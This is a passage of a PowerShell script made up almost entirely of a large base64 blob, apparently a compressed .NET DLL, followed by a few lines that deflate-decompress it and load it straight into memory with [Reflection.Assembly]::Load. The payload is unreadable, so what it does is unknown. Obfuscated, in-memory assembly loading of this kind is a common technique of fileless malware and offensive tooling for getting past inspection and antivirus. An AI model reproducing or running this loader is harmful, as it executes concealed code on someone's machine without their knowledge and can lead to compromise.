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
'@
$DeflatedStream = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($EncodedCompressedDll),[IO.Compression.CompressionMode]::Decompress)
$UncompressedBytes = New-Object Byte[](40448)
$DeflatedStream.Read($UncompressedBytes, 0, 40448) | Out-Null
$null = [Reflection.Assembly]::Load($UncompressedBytes)
